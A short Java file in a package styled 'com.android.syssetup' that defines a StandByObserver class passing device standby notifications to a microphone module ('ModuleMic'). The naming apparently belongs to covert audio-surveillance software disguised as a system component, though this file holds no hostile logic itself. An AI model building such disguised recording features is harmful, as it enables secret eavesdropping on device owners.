package com.android.syssetup.module;

import com.android.syssetup.Standby;
import com.android.syssetup.interfaces.Observer;

public class StandByObserver implements Observer<Standby> {

	private ModuleMic moduleMic;

	public StandByObserver(ModuleMic moduleMic) {
		this.moduleMic = moduleMic;
	}

	@Override
	public int notification(Standby b) {
		return moduleMic.notification(b);
	}

}


